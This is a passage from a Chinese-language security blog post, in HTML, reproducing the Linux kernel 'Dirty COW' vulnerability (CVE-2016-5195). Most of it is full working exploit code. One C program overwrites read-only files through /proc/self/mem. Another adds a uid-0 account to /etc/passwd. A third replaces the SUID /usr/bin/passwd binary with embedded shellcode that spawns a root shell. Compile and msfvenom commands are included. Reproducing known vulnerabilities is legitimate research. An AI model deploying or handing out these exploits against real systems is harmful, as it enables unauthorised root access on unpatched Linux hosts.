class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./poc destination_file fake_file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    fk_fd = open(argv[<span class="number">2</span>], O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\nfd of fk: %d\n&quot;</span>, dst_fd, fk_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    fstat(fk_fd, &amp;fk_st); <span class="comment">// get fake file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fake_content = <span class="built_in">malloc</span>(fk_st.st_size);</span><br><span class="line">    read(fk_fd, fake_content, fk_st.st_size);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_content, fk_st.st_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行，成功修改只读文件</p>
<p><img src="https://i.loli.net/2021/04/14/KBuysmMaRiToVHc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="一、新建-root-用户"><a href="#一、新建-root-用户" class="headerlink" title="一、新建 root 用户"></a>一、新建 root 用户</h3><p>我们可以通过修改 <code>/etc/passwd</code> 这个文件的方式向其中添加一个 uid 为 0 的新用户，之后再登入这个用户即可完成提权拿到 root shell，具体的构造过程就不在此赘叙了</p>
<p>exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * exploit by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.5.24</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_user;</span><br><span class="line"><span class="type">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *username;</span><br><span class="line">    <span class="type">char</span> *hash;</span><br><span class="line">    <span class="type">int</span> user_id;</span><br><span class="line">    <span class="type">int</span> group_id;</span><br><span class="line">    <span class="type">char</span> *info;</span><br><span class="line">    <span class="type">char</span> *home_dir;</span><br><span class="line">    <span class="type">char</span> *shell;</span><br><span class="line">&#125;hacker = </span><br><span class="line">&#123;</span><br><span class="line">    .user_id = <span class="number">0</span>,</span><br><span class="line">    .group_id = <span class="number">0</span>,</span><br><span class="line">    .info = <span class="string">&quot;a3pwn&quot;</span>,</span><br><span class="line">    .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">    .shell = <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hacker.username = argv[<span class="number">1</span>];</span><br><span class="line">    hacker.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>, </span><br><span class="line">        hacker.username, </span><br><span class="line">        hacker.hash, </span><br><span class="line">        hacker.user_id, </span><br><span class="line">        hacker.group_id, </span><br><span class="line">        hacker.info, </span><br><span class="line">        hacker.home_dir, </span><br><span class="line">        hacker.shell);</span><br><span class="line">    fake_user = (<span class="type">char</span> * ) <span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>, </span><br><span class="line">        hacker.username, </span><br><span class="line">        hacker.hash, </span><br><span class="line">        hacker.user_id, </span><br><span class="line">        hacker.group_id, </span><br><span class="line">        hacker.info, </span><br><span class="line">        hacker.home_dir, </span><br><span class="line">        hacker.shell);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st); <span class="comment">// get /etc/passwd file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>crypt() 为非标准库函数，编译的时候需要加上 <code>-lcrypt</code> 参数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc dirty.c -o dirty -static -lpthread -lcrypt</span><br></pre></td></tr></table></figure>

<p>运行，成功拿到 root shell</p>
<p><img src="https://i.loli.net/2021/05/24/2fU3GIw7W8BoTMe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="二、SUID-提权"><a href="#二、SUID-提权" class="headerlink" title="二、SUID 提权"></a>二、SUID 提权</h3><p>既然有了任意文件读写，那么我们可以选择一些具有特殊权限的文件（SUID&#x2F;SGID，即被设定好其执行用户（组）权限的一些文件，如 <code>/usr/bin/passwd</code>），将其改写为我们构造好的特定代码，我们在执行时就能完成提权</p>
<p>笔者这里选择改写 <code>/usr/bin/passwd</code> 以完成提权，因为这个程序有着 root 的执行权限</p>
<p>在这里笔者选择使用 <code>msfvenom</code> 这一个工具构造 payload，如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i</span><br></pre></td></tr></table></figure>

<p>exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * poc by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.4.14</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sc[] = &#123;</span><br><span class="line">  <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sc_len = <span class="number">149</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(<span class="string">&quot;/usr/bin/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\n&quot;</span>, dst_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, sc, sc_len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行，成功提权到 root</p>
<p><img src="https://i.loli.net/2021/04/15/zy7V5Zu9AQdnREX.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>msfvenom 使用格式如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/CVE/">#CVE</a>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
      
        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
      
        <a href="/tags/%E8%84%8F%E7%89%9B/">#脏牛</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析</div>
      <div>http://blog.arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2021年4月8日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/04/24/CVE-0X01-CVE-2021-3156/" title="【CVE.0x01】CVE-2021-3156 sudo 堆溢出漏洞复现及简要分析">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">【CVE.0x01】CVE-2021-3156 sudo 堆溢出漏洞复现及简要分析</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
